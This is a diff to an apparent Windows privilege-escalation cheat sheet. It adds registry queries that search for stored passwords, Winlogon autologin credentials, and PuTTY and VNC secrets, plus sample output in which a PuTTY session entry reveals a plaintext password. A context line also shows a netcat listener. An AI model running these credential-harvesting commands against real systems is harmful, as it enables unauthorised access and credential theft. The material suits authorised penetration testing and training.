@@ -1785,6 +1785,29 @@ nc -nlvp 636 #wait 5 minutes
 ````
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md #Last Resort
 ````
+### Registry Keys
+````
+REG QUERY HKLM /F "password" /t REG_SZ /S /K
+REG QUERY HKCU /F "password" /t REG_SZ /S /K
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
+reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
+
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+````
+#### Putty
+````
+PS C:\Windows\System32> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+
+HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions
+    zachary    REG_SZ    "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"
+````
 ### Windows Service - Insecure Service Permissions
 #### Windows XP SP0/SP1 Privilege Escalation
 ````
